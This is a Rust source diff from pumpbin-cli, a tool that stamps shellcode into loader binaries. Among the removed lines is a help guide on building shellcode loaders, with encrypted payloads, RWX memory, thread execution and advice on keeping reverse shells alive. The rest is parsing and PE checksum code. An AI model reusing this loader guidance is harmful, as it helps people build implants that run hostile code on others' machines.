     let file_size = bytes.len();
@@ -1942,29 +1386,6 @@ fn inspect_loader_binary(path: &Path, bytes: &[u8], json: bool) {
     let holder_found = size_holder_offset.is_some();
     let suitable = marker_found && holder_found;
 
-    if json {
-        #[derive(serde::Serialize)]
-        struct LoaderReport {
-            file: String,
-            file_size: usize,
-            platform: String,
-            shellcode_marker: Option<usize>,
-            size_holder: Option<usize>,
-            capacity_bytes: Option<usize>,
-            suitable_for_stamp: bool,
-        }
-        emit_json_ok(LoaderReport {
-            file: path.display().to_string(),
-            file_size,
-            platform,
-            shellcode_marker: prefix_offset,
-            size_holder: size_holder_offset,
-            capacity_bytes: capacity,
-            suitable_for_stamp: suitable,
-        });
-        return;
-    }
-
     println!("file:      {} ({} bytes)", path.display(), file_size);
     println!("format:    {}", platform);
     println!();
@@ -1990,121 +1411,7 @@ fn inspect_loader_binary(path: &Path, bytes: &[u8], json: bool) {
         println!("verdict:   SUITABLE: ready for pumpbin-cli stamp");
     } else {
         println!("verdict:   NOT SUITABLE: add markers before stamping");
-        println!("           pumpbin-cli inspect --help-markers");
     }
-}
-
-/// Print a concise, language-agnostic guide on how to embed PumpBin
-/// markers into a loader. Called by `inspect --help-markers`.
-fn print_help_markers() {
-    println!(
-        r#"PUMPBIN MARKER REFERENCE
-
-PumpBin locates shellcode in a compiled binary by scanning for a known
-byte sequence (the marker). Two markers must be present:
-
-  SHELLCODE MARKER   $$SHELLCODE$$  (13 bytes)
-    Marks the start of the shellcode region.
-    Follow it immediately with N bytes of constant padding. The loader
-    will execute the shellcode placed here by pumpbin-cli stamp.
-
-  SIZE HOLDER        $$99999$$      (9 bytes)
-    Replaced at stamp time with the shellcode length as a decimal string.
-    Your loader reads this at runtime to get the byte count.
-
-RUST (recommended: pumpbin-cli new-loader handles this automatically)
-
-  In build.rs:
-    let mut buf = b"$$SHELLCODE$$".to_vec();
-    buf.extend(std::iter::repeat(b'0').take(1_048_576)); // 1 MiB capacity
-    // WARNING: do NOT use b'\0' (null) for padding. Null bytes are placed in
-    // the BSS section which has no file representation — the marker will not
-    // appear in the compiled binary and pumpbin will fail to find it.
-    // Use any non-null byte: b'0', b'\x90', b'\xcc', etc.
-    std::fs::write("shellcode.bin", buf).unwrap();
-
-  In src/main.rs:
-    use std::hint::black_box;
-
-    // black_box + #[inline(never)] prevent the release optimizer from treating
-    // SC and SZ as dead code and eliminating them. Without these attributes,
-    // LLVM will detect that SZ.parse() returns Err at compile time (since
-    // "$$99999$$" is not a valid decimal), conclude that &SC[..0] is always
-    // the result, and eliminate SC entirely from the binary.
-    #[inline(never)]
-    fn shellcode_buf() -> &'static [u8] {{ black_box(include_bytes!("../shellcode.bin")) }}
-    #[inline(never)]
-    fn size_holder() -> &'static str {{ black_box("$$99999$$") }}
-
-    // In your loader function:
-    let len = size_holder().trim_matches('$').parse::<usize>().unwrap_or(0);
-    let shellcode = &shellcode_buf()[..len];
-    // IMPORTANT: after stamping, shellcode_buf()[0] is byte 0 of your shellcode.
-    // The $$SHELLCODE$$ prefix is overwritten and gone. Do NOT add any offset.
-
-  For AES-256-GCM encryption (via --encrypt-module aes-gcm), also add:
-    // These holders are stamped with a fresh random key+nonce per generate run.
-    #[inline(never)]
-    fn aes_key()   -> &'static [u8; 32] {{ black_box(b"$$KKKKKKKKKKKKKKKKKKKKKKKKKKKK$$") }}
-    #[inline(never)]
-    fn aes_nonce() -> &'static [u8; 12] {{ black_box(b"$$NNNNNNNN$$") }}
-
-  Then in Cargo.toml:
-    aes-gcm = {{ version = "0.10", default-features = false, features = ["aes", "alloc"] }}
-
-  And decrypt at runtime:
-    use aes_gcm::{{Aes256Gcm, KeyInit, aead::Aead, Key, Nonce}};
-    let key = Key::<Aes256Gcm>::from_slice(aes_key());
-    let nonce = Nonce::from_slice(aes_nonce());
-    let shellcode = Aes256Gcm::new(key).decrypt(nonce, &shellcode_buf()[..len]).unwrap();
-
-  For XOR encryption (via --encrypt-module xor), add this holder:
-    // The xor module stamps the single-byte key into the 7-byte '  XOR  ' slot.
-    #[inline(never)]
-    fn xor_key_holder() -> &'static [u8; 7] {{ black_box(b"  XOR  ") }}
-    // Read the key at runtime: xor_key_holder()[0]
-
-C / C++ (volatile prevents the optimizer from removing the region)
-
-    volatile unsigned char sc[] =
-        "$$SHELLCODE$$"
-        "\x90\x90\x90..."   // N non-null bytes for capacity (NOT \x00 — see BSS note above)
-    ;
-    volatile char sz[] = "$$99999$$";
-    size_t len = strtoul((char*)sz, NULL, 10);
-
-RUNTIME REQUIREMENTS
-
-  After stamping, your loader must satisfy these at execution time:
-
-  1. Shellcode starts at offset 0 — shellcode_buf()[0] is byte 0 of your payload.
-     The $$SHELLCODE$$ prefix is overwritten. Do not skip any bytes.
-
-  2. Keep the process alive — use WaitForSingleObject(thread_handle, INFINITE).
-     A reverse shell takes several seconds to connect. If main() returns first,
-     the OS kills the process and the shell dies with it.
-
-  3. Use a thread, not a direct call — most payloads need TEB/PEB thread context.
-     CreateThread or equivalent. Do not transmute the buffer to fn() and call it.
-
-  4. Executable memory — allocate with PAGE_EXECUTE_READWRITE, or protect the
-     region before the thread starts. For NtCreateSection, section and view
-     protections must be compatible (PAGE_EXECUTE_READWRITE on both is safe).
-
-VERIFY
-
-  After building your loader, confirm the markers are present:
-    pumpbin-cli inspect loader.exe
-  The verdict line will say "SUITABLE: ready for pumpbin-cli stamp" when
-  all required markers are found.
-  If you inspect an already-stamped implant, "NOT SUITABLE" is expected —
-  the markers were consumed during stamping.
-
-STAMP
-
-    pumpbin-cli stamp loader.exe payload.bin
-"#
-    );
 }
 
 fn default_scaffold_platform() -> String {
@@ -2204,10 +1511,16 @@ fn pack_crate(
     // default post chain.
     let mut cfg = BTreeMap::new();
     let mut post_modules = Vec::new();
-    for (idx, post) in md.post.iter().enumerate() {
+    for post in &md.post {
         post_modules.push(post.id.clone());
-        for (k, v) in &post.config {
-            cfg.insert(format!("post_chain.{}.config.{}", idx, k), v.clone());
+        if !post.config.is_empty() {
+            let args = post
+                .config
+                .iter()
+                .map(|(k, v)| format!("{k}={v}"))
+                .collect::<Vec<_>>()
+                .join(";");
+            cfg.insert(format!("post:{}", post.id), args);
         }
     }
 
@@ -2335,559 +1648,46 @@ fn parse_module_config(entries: &[String]) -> Result<BTreeMap<String, String>> {
     Ok(map)
 }
 
-fn parse_post_entry(entry: &str) -> Result<(String, Vec<String>)> {
-    let (id, args) = match entry.split_once(':') {
-        Some((id, args)) => (id.trim(), parse_inline_post_args(args)?),
-        None => (entry.trim(), Vec::new()),
+fn parse_post_entry(entry: &str) -> Result<(String, Option<String>)> {
+    let (id, arg) = match entry.split_once(':') {
+        Some((id, arg)) => (id.trim(), Some(arg.trim())),
+        None => (entry.trim(), None),
     };
 
     if id.is_empty() {
         bail!("Invalid --post value '{}': empty module id", entry);
     }
-
-    Ok((id.to_string(), args))
-}
-
-fn parse_inline_post_args(input: &str) -> Result<Vec<String>> {
-    let mut args = Vec::new();
-    let mut current = String::new();
-
-    for raw in input.split(',') {
-        let part = raw.trim();
-        if part.is_empty() {
-            continue;
-        }
-
-        if looks_like_key_value_arg(part) {
-            if !current.is_empty() {
-                args.push(current);
-            }
-            current = part.to_string();
-        } else if current.is_empty() {
-            bail!("Invalid --post args '{}': expected key=value", input);
-        } else {
-            current.push(',');
-            current.push_str(part);
-        }
-    }
-
-    if !current.is_empty() {
-        args.push(current);
-    }
-
-    Ok(args)
-}
-
-fn looks_like_key_value_arg(part: &str) -> bool {
-    let Some((key, _)) = part.split_once('=') else {
-        return false;
-    };
-    !key.is_empty()
-        && key
-            .chars()
-            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
-}
-
-fn encode_post_args(args: &[String]) -> String {
-    args.join(";")
-}
-
-fn parse_post_module_config_entry(entry: &str) -> Result<(usize, String, String)> {
-    let (idx_raw, kv) = entry
-        .split_once(':')
-        .ok_or_else(|| anyhow!("Invalid --post-config '{}'. Expected IDX:KEY=VALUE", entry))?;
-
-    let idx = idx_raw
-        .parse::<usize>()
-        .map_err(|_| anyhow!("Invalid post-config index '{}' in '{}'.", idx_raw, entry))?;
-
-    let (key, value) = kv
-        .split_once('=')
-        .ok_or_else(|| anyhow!("Invalid --post-config '{}'. Expected IDX:KEY=VALUE", entry))?;
-
-    let key = key.trim();
-    if key.is_empty() {
-        bail!("Invalid --post-config '{}': empty key", entry);
-    }
-
-    Ok((idx, key.to_string(), value.to_string()))
-}
-
-fn maybe_expand_home_path(value: &str) -> PathBuf {
-    if value == "~" {
-        return home_dir().unwrap_or_else(|| PathBuf::from(value));
-    }
-
-    if let Some(rest) = value.strip_prefix("~/") {
-        if let Some(home) = home_dir() {
-            return home.join(rest);
-        }
-    }
-
-    PathBuf::from(value)
-}
-
-fn looks_like_path(value: &str) -> bool {
-    value.starts_with('/')
-        || value.starts_with('~')
-        || value.starts_with("./")
-        || value.starts_with("../")
-        || value.contains('/')
-        || value.contains('\\')
-}
-
-fn normalize_file_value(field_key: &str, value: &str) -> Result<String> {
-    let trimmed = value.trim();
-    if trimmed.is_empty() {
-        return Ok(String::new());
-    }
-
-    let path = maybe_expand_home_path(trimmed);
-    if path.is_file() {
-        let bytes = std::fs::read(&path)
-            .map_err(|e| anyhow!("failed to read file for '{}': {}", field_key, e))?;
-        return Ok(general_purpose::STANDARD.encode(bytes));
-    }
-
-    if general_purpose::STANDARD.decode(trimmed).is_ok() {
-        return Ok(trimmed.to_string());
-    }
-
-    if looks_like_path(trimmed) {
-        return Err(anyhow!(
-            "file config '{}' points to '{}' but the file was not found",
-            field_key,
-            trimmed
-        ));
-    }
-
-    Ok(value.to_string())
-}
-
-fn normalize_file_path_value(value: &str) -> String {
-    let trimmed = value.trim();
-    if trimmed.is_empty() {
-        return String::new();
-    }
-
-    maybe_expand_home_path(trimmed)
-        .to_string_lossy()
-        .to_string()
-}
-
-fn is_reserved_runtime_key(key: &str) -> bool {
-    key.starts_with("post_chain.")
-}
-
-fn normalize_reserved_runtime_config(
-    mut config: BTreeMap<String, String>,
-) -> Result<BTreeMap<String, String>> {
-    let keys = config.keys().cloned().collect::<Vec<_>>();
-
-    for key in keys {
-        if is_reserved_runtime_key(&key).not() {
-            continue;
-        }
-
-        let Some(value) = config.get(&key).cloned() else {
-            continue;
+    if let Some(arg) = arg {
+        let Some((key, _)) = arg.split_once('=') else {
+            bail!("Invalid --post value '{}': expected id:key=value", entry);
         };
-
-        if key.ends_with(".module_b64") {
-            let normalized = normalize_file_value(&key, &value)?;
-            config.insert(key, normalized);
-            continue;
-        }
-
-        if key.ends_with(".module_path") {
-            let normalized = normalize_file_path_value(&value);
-            config.insert(key, normalized);
-            continue;
-        }
-
-        if key.contains(".config.") && key.ends_with("_base64") {
-            let normalized = normalize_file_value(&key, &value)?;
-            config.insert(key, normalized);
-            continue;
-        }
-
-        if key.contains(".config.") && key.ends_with("_path") {
-            let normalized = normalize_file_path_value(&value);
-            config.insert(key, normalized);
-            continue;
+        if key.trim().is_empty() {
+            bail!("Invalid --post value '{}': empty arg key", entry);
         }
     }
 
-    Ok(config)
+    Ok((id.to_string(), arg.map(str::to_string)))
 }
 
-#[derive(Debug)]
-struct PeVerifyReport {
-    is_pe: bool,
-    checksum_current: Option<u32>,
-    checksum_calculated: Option<u32>,
-    checksum_valid: bool,
-    security_dir_va: Option<u32>,
-    security_dir_size: Option<u32>,
-    markers: Vec<(String, usize)>,
-}
-
-fn verify_binary(binary: &PathBuf) -> Result<()> {
-    let bytes = std::fs::read(binary)
-        .with_context(|| format!("failed to read binary: {}", binary.display()))?;
-
-    let pe = analyze_pe(&bytes)?;
-
-    // Collect human-readable failure reasons. Each push here makes the final
-    // exit code non-zero, so automation can `pumpbin-cli verify --binary X`
-    // and trust the exit status. Pre-1.1.3 verify always returned Ok(())
-    // even with `PE format: no` and `Authenticode invalid`, causing false
-    // passes in CI pipelines.
-    let mut failures: Vec<String> = Vec::new();
-
-    println!("Binary: {}", binary.display());
-    println!("PE format: {}", if pe.is_pe { "yes" } else { "no" });
-
-    // PE-specific checks (Authenticode signature, IMAGE_OPTIONAL_HEADER
-    // checksum, embedded markers) only make sense on a valid PE. On
-    // ELF/Mach-O/etc. we report once that the input isn't a PE and
-    // short-circuit — running osslsigncode on an ELF produced two
-    // confusing failure lines for one underlying fact.
-    if !pe.is_pe {
-        bail!("input is not a valid PE binary");
+fn append_post_entry(
+    modules: &mut Vec<String>,
+    config: &mut BTreeMap<String, String>,
+    entry: &str,
+) -> Result<()> {
+    let (id, arg) = parse_post_entry(entry)?;
+    if modules.last() != Some(&id) {
+        modules.push(id.clone());
     }
-
-    let auth = verify_authenticode(binary, pe.security_dir_size.unwrap_or(0));
-
-    if let (Some(current), Some(calculated)) = (pe.checksum_current, pe.checksum_calculated) {
-        println!(
-            "PE checksum: current=0x{current:08X}, calculated=0x{calculated:08X}, valid={}",
-            pe.checksum_valid
-        );
-        if !pe.checksum_valid {
-            failures.push(format!(
-                "PE checksum mismatch (current=0x{current:08X}, calculated=0x{calculated:08X})"
-            ));
-        }
-    } else {
-        println!("PE checksum: unavailable");
-    }
-
-    if let (Some(va), Some(size)) = (pe.security_dir_va, pe.security_dir_size) {
-        println!(
-            "Authenticode directory: va=0x{va:08X}, size={} bytes{}",
-            size,
-            if size > 0 { " (present)" } else { "" }
-        );
-    } else {
-        println!("Authenticode directory: unavailable");
-    }
-
-    println!("Authenticode verify: {}", auth.summary);
-    if let Some(detail) = auth.detail {
-        println!("Authenticode detail: {}", detail);
-    }
-    if matches!(auth.status, AuthCheckStatus::Failed) {
-        failures.push(format!("Authenticode verify failed: {}", auth.summary));
-    }
-
-    if pe.markers.is_empty() {
-        println!("Module markers: none");
-    } else {
-        println!("Module markers:");
-        for (name, offset) in pe.markers {
-            println!("- {} @ 0x{:X} ({})", name, offset, offset);
-        }
-    }
-
-    if failures.is_empty() {
-        Ok(())
-    } else {
-        bail!(
-            "verify reported {} failure(s):\n  - {}",
-            failures.len(),
-            failures.join("\n  - ")
-        );
-    }
-}
-
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-enum AuthCheckStatus {
-    /// osslsigncode verify returned success.
-    Valid,
-    /// osslsigncode verify returned non-zero exit.
-    Failed,
-    /// We could not run a verification (no osslsigncode on PATH, or no
-    /// signature blob present). Reported neutrally — does NOT count as
-    /// failure for exit-code purposes.
-    NotApplicable,
-}
-
-#[derive(Debug)]
-struct AuthVerifyStatus {
-    summary: String,
-    detail: Option<String>,
-    status: AuthCheckStatus,
-}
-
-fn verify_authenticode(path: &Path, security_dir_size: u32) -> AuthVerifyStatus {
-    let output = Command::new("osslsigncode")
-        .arg("verify")
-        .arg("-in")
-        .arg(path)
-        .output();
-
-    match output {
-        Ok(out) => {
-            let combined = format!(
-                "{}{}",
-                String::from_utf8_lossy(&out.stdout),
-                String::from_utf8_lossy(&out.stderr)
-            );
-            let first_line = combined
-                .lines()
-                .find(|l| l.trim().is_empty().not())
-                .unwrap_or("no output")
-                .trim()
-                .to_string();
-
-            if out.status.success() {
-                AuthVerifyStatus {
-                    summary: "valid (osslsigncode verify succeeded)".to_string(),
-                    detail: Some(first_line),
-                    status: AuthCheckStatus::Valid,
+    if let Some(arg) = arg {
+        config
+            .entry(format!("post:{id}"))
+            .and_modify(|existing| {
+                if !existing.is_empty() {
+                    existing.push(';');
                 }
-            } else if security_dir_size == 0 {
-                // osslsigncode exits non-zero for unsigned binaries.
-                // That is not a failure — it is an unsigned binary.
-                AuthVerifyStatus {
-                    summary: "unsigned (no Authenticode signature present)".to_string(),
-                    detail: None,
-                    status: AuthCheckStatus::NotApplicable,
-                }
-            } else {
-                AuthVerifyStatus {
-                    summary: "invalid (osslsigncode verify failed)".to_string(),
-                    detail: Some(first_line),
-                    status: AuthCheckStatus::Failed,
-                }
-            }
-        }
-        Err(_) => {
-            if security_dir_size > 0 {
-                AuthVerifyStatus {
-                    summary:
-                        "signature blob present, but osslsigncode is unavailable for cryptographic verification"
-                            .to_string(),
-                    detail: None,
-                    status: AuthCheckStatus::NotApplicable,
-                }
-            } else {
-                AuthVerifyStatus {
-                    summary: "no signature blob detected".to_string(),
-                    detail: None,
-                    status: AuthCheckStatus::NotApplicable,
-                }
-            }
-        }
-    }
-}
-
-fn analyze_pe(bytes: &[u8]) -> Result<PeVerifyReport> {
-    let markers = collect_markers(bytes);
-
-    if bytes.len() < 0x40 || &bytes[0..2] != b"MZ" {
-        return Ok(PeVerifyReport {
-            is_pe: false,
-            checksum_current: None,
-            checksum_calculated: None,
-            checksum_valid: false,
-            security_dir_va: None,
-            security_dir_size: None,
-            markers,
-        });
-    }
-
-    let e_lfanew = read_u32(bytes, 0x3C)
-        .ok_or_else(|| anyhow!("invalid DOS header: missing e_lfanew"))?
-        as usize;
-    if e_lfanew + 24 > bytes.len() {
-        bail!("invalid PE header offset");
-    }
-    if &bytes[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
-        return Ok(PeVerifyReport {
-            is_pe: false,
-            checksum_current: None,
-            checksum_calculated: None,
-            checksum_valid: false,
-            security_dir_va: None,
-            security_dir_size: None,
-            markers,
-        });
-    }
-
-    let coff = e_lfanew + 4;
-    let size_of_optional_header =
-        read_u16(bytes, coff + 16).ok_or_else(|| anyhow!("invalid COFF header"))? as usize;
-    let opt = coff + 20;
-    if opt + size_of_optional_header > bytes.len() {
-        bail!("invalid optional header size");
-    }
-
-    let magic = read_u16(bytes, opt).ok_or_else(|| anyhow!("invalid optional header magic"))?;
-    let data_dir_off = match magic {
-        0x10B => opt + 96,
-        0x20B => opt + 112,
-        _ => {
-            return Ok(PeVerifyReport {
-                is_pe: true,
-                checksum_current: None,
-                checksum_calculated: None,
-                checksum_valid: false,
-                security_dir_va: None,
-                security_dir_size: None,
-                markers,
+                existing.push_str(&arg);
             })
-        }
-    };
-
-    let checksum_off = opt + 64;
-    let checksum_current = read_u32(bytes, checksum_off);
-    let checksum_calculated = checksum_current.map(|_| compute_pe_checksum(bytes, checksum_off));
-
-    let security_entry_off = data_dir_off + 8 * 4;
-    let security_dir_va = read_u32(bytes, security_entry_off);
-    let security_dir_size = read_u32(bytes, security_entry_off + 4);
-
-    let checksum_valid = match (checksum_current, checksum_calculated) {
-        (Some(c), Some(calc)) => c == calc,
-        _ => false,
-    };
-
-    Ok(PeVerifyReport {
-        is_pe: true,
-        checksum_current,
-        checksum_calculated,
-        checksum_valid,
-        security_dir_va,
-        security_dir_size,
-        markers,
-    })
-}
-
-fn read_u16(data: &[u8], off: usize) -> Option<u16> {
-    let end = off.checked_add(2)?;
-    let bytes = data.get(off..end)?;
-    Some(u16::from_le_bytes([bytes[0], bytes[1]]))
-}
-
-fn read_u32(data: &[u8], off: usize) -> Option<u32> {
-    let end = off.checked_add(4)?;
-    let bytes = data.get(off..end)?;
-    Some(u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]))
-}
-
-fn compute_pe_checksum(data: &[u8], checksum_offset: usize) -> u32 {
-    let mut sum: u64 = 0;
-    let mut i = 0usize;
-
-    while i + 1 < data.len() {
-        if i == checksum_offset || i == checksum_offset + 2 {
-            i += 2;
-            continue;
-        }
-
-        let word = u16::from_le_bytes([data[i], data[i + 1]]) as u64;
-        sum += word;
-        sum = (sum & 0xFFFF) + (sum >> 16);
-        i += 2;
+            .or_insert(arg);
     }
-
-    if data.len() % 2 == 1 {
-        sum += data[data.len() - 1] as u64;
-        sum = (sum & 0xFFFF) + (sum >> 16);
-    }
-
-    sum = (sum & 0xFFFF) + (sum >> 16);
-    sum = sum + (sum >> 16);
-
-    ((sum & 0xFFFF) as u32).wrapping_add(data.len() as u32)
-}
-
-fn collect_markers(data: &[u8]) -> Vec<(String, usize)> {
-    let patterns = ["PB-AUTHSIG", "PB-ICON"];
-    let mut out = Vec::new();
-
-    for pattern in patterns {
-        for offset in find_all_occurrences(data, pattern.as_bytes()) {
-            out.push((pattern.to_string(), offset));
-        }
-    }
-
-    out.sort_by_key(|(_, off)| *off);
-    out
-}
-
-fn find_all_occurrences(haystack: &[u8], needle: &[u8]) -> Vec<usize> {
-    if needle.is_empty() || haystack.len() < needle.len() {
-        return Vec::new();
-    }
-
-    let mut out = Vec::new();
-    let mut i = 0usize;
-    while i + needle.len() <= haystack.len() {
-        if &haystack[i..i + needle.len()] == needle {
-            out.push(i);
-            i += needle.len();
-        } else {
-            i += 1;
-        }
-    }
-
-    out
-}
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-
-    #[test]
-    fn parse_post_entry_splits_multiple_key_value_args() {
-        let (id, args) = parse_post_entry("pe-version-info:CompanyName=Acme,ProductName=Demo")
-            .expect("post entry should parse");
-
-        assert_eq!(id, "pe-version-info");
-        assert_eq!(
-            args,
-            vec![
-                "CompanyName=Acme".to_string(),
-                "ProductName=Demo".to_string()
-            ]
-        );
-        assert_eq!(encode_post_args(&args), "CompanyName=Acme;ProductName=Demo");
-    }
-
-    #[test]
-    fn parse_post_entry_keeps_commas_inside_arg_values() {
-        let (id, args) =
-            parse_post_entry("byte-patch:patches=4831d2:4833d2,4831c0:4833c0,mode=first")
-                .expect("post entry should parse");
-
-        assert_eq!(id, "byte-patch");
-        assert_eq!(
-            args,
-            vec![
-                "patches=4831d2:4833d2,4831c0:4833c0".to_string(),
-                "mode=first".to_string(),
-            ]
-        );
-    }
-
-    #[test]
-    fn parse_post_entry_rejects_arg_without_key() {
-        let err = parse_post_entry("byte-patch:4831d2:4833d2")
-            .unwrap_err()
-            .to_string();
-        assert!(err.contains("expected key=value"), "got: {err}");
-    }
+    Ok(())
 }
